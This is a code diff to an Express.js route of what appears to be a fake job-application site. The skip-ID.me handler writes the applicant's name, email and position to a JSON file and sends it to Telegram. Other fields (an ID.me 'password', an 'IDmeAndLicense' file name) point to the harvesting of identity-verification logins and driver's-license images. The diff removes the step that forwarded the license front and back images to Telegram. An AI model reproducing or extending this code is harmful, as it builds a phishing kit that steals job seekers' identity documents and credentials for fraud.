@@ -315,22 +315,15 @@ router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), as
   });
 });
 
-router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
+router.post('/skip-idme/', requireSession, async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
-  const dlFront = req.files['driversLicenseFront']?.[0];
-  const dlBack = req.files['driversLicenseBack']?.[0];
-  if (!dlFront || !dlBack) {
-    return res.status(400).render('verify', {
-      email: req.body.email || req.session.applicationDraft.email || '',
-      position: req.session.applicationDraft.position || '',
-      errorMessage: 'Both front and back of your driver\'s license/ID are required.',
-      missingFront: !dlFront,
-      missingBack: !dlBack
-    });
-  }
-  req.session.driversLicenseFiles = [dlFront, dlBack];
+  req.session.driversLicenseFiles = null;
   req.session.verified = true;
-  req.session.idme = {};
+  req.session.idme = {
+    email: req.body.email || '',
+    password: '',
+    skipped: true
+  };
 
   const application = req.session.applicationDraft;
   const interviewAnswers = (req.session.interviewAnswers && typeof req.session.interviewAnswers === 'object') ? req.session.interviewAnswers : {};
@@ -377,34 +370,17 @@ router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields)
     const idmePayload = {
       applicant: {
         name: `${application.firstName} ${application.lastName}`,
-        email: application.email,
+        email: req.body.email || application.email,
         position: application.position,
       },
-      idme_credentials: {},
-      drivers_license: {
-        front: {
-          filename: dlFront.originalname,
-          mimetype: dlFront.mimetype,
-        },
-        back: {
-          filename: dlBack.originalname,
-          mimetype: dlBack.mimetype,
-        },
-      }
+      idme_credentials: { skipped: true },
+      drivers_license: { skipped: true }
     };
     const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
     const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
     fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
     await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
     fs.unlinkSync(idmeFilepath);
-  } catch (err) {}
-
-  try {
-    await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
-    fs.unlinkSync(dlFront.path);
-    await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
-    fs.unlinkSync(dlBack.path);
-    req.session.driversLicenseFiles = null;
   } catch (err) {}
 
   req.session.save((err) => {
